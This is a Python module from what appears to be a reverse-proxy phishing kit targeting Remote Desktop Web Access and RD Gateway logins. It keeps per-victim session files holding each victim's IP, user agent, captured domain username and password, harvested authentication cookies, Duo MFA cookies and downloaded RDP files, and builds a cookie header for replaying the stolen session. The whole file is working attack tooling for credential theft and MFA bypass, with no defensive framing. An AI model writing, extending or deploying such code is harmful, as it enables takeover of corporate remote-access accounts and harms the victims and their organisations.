"""Per-victim relay sessions with JSON artifact persistence."""
import json
import os
import secrets
import threading
import time
from datetime import datetime, timezone

SESSION_COOKIE = "__rdwr_sid"
AUTH_COOKIE_MARKERS = ("tswaauthhttponlycookie", ".aspxauth", "rdwebauth",
                       "rdgatewayauth")


def utcnow():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


class RelaySession:
    def __init__(self, store, sid=None):
        self.sid = sid or secrets.token_hex(8)
        self.store = store
        self.created = time.time()
        self.data = {
            "session_id": self.sid,
            "created": utcnow(),
            "victim_ip": None,
            "user_agent": None,
            "credentials": None,
            "auth_state": "none",
            "cookies": {},
            "duo": {},
            "events": [],
            "harvest": {"feed_saved": False, "rdp_files": []},
            "killchain": None,
        }
        self.lock = threading.Lock()
        self.dir = os.path.join(store.dir, "sessions", self.sid)
        os.makedirs(self.dir, exist_ok=True)
        os.makedirs(os.path.join(self.dir, "artifacts"), exist_ok=True)

    def event(self, kind, **kw):
        ev = {"ts": utcnow(), "type": kind}
        ev.update(kw)
        self.data["events"].append(ev)
        self.save()

    def set_victim(self, ip, ua):
        self.data["victim_ip"] = ip
        self.data["user_agent"] = ua

    def capture_credentials(self, creds):
        self.data["credentials"] = creds
        self.data["auth_state"] = "credentials_captured"
        self.event("credentials_captured",
                   user="%s\\%s" % (creds.get("domain") or "?",
                                    creds.get("username") or "?"),
                   password_len=len(creds.get("password") or ""))

    def capture_cookies(self, set_cookie_lines):
        changed = []
        for line in set_cookie_lines:
            pair = line.split(";", 1)[0]
            if "=" not in pair:
                continue
            name, _, val = pair.partition("=")
            name = name.strip()
            val = val.strip()
            if not name:
                continue
            if self.data["cookies"].get(name) != val:
                self.data["cookies"][name] = val
                changed.append(name)
        return changed

    def auth_cookie_seen(self):
        for name in self.data["cookies"]:
            if any(m in name.lower() for m in AUTH_COOKIE_MARKERS):
                return True
        return False

    def mark_auth_cookies(self):
        if self.data["auth_state"] in ("none", "credentials_captured"):
            self.data["auth_state"] = "auth_cookies_captured"
            self.event("auth_cookies_captured",
                       cookie_names=sorted(self.data["cookies"]))

    def capture_duo(self, info):
        d = self.data.setdefault("duo", {})
        for k, v in info.items():
            if v is not None and d.get(k) != v:
                d[k] = v
        self.save()

    def capture_duo_cookie(self, name, value):
        d = self.data.setdefault("duo", {}).setdefault("cookies", {})
        if d.get(name) != value:
            d[name] = value
            self.save()

    def artifact_path(self, name):
        p = os.path.join(self.dir, "artifacts", name)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        return p

    def save_artifact(self, name, data):
        if isinstance(data, str):
            data = data.encode("utf-8", "replace")
        with open(self.artifact_path(name), "wb") as f:
            f.write(data)

    def save(self):
        self.store._save(self)

    def cookie_header(self):
        return "; ".join("%s=%s" % kv for kv in self.data["cookies"].items())


class SessionStore:
    def __init__(self, base_dir):
        self.dir = base_dir
        os.makedirs(os.path.join(base_dir, "sessions"), exist_ok=True)
        self._sessions = {}
        self._lock = threading.Lock()

    def _save(self, sess):
        tmp = os.path.join(sess.dir, ".session.json.tmp")
        with open(tmp, "w") as f:
            json.dump(sess.data, f, indent=2)
        os.replace(tmp, os.path.join(sess.dir, "session.json"))

    def get_or_create(self, sid, ip=None, ua=None):
        with self._lock:
            s = self._sessions.get(sid)
            if s is None:
                s = RelaySession(self, sid=sid)
                self._sessions[s.sid] = s
            if ip or ua:
                s.set_victim(ip, ua)
            return s

    def all(self):
        with self._lock:
            return list(self._sessions.values())

    def reap(self, ttl):
        now = time.time()
        with self._lock:
            dead = [s for s in self._sessions.values()
                    if now - s.created > ttl]
            for s in dead:
                del self._sessions[s.sid]
        return dead
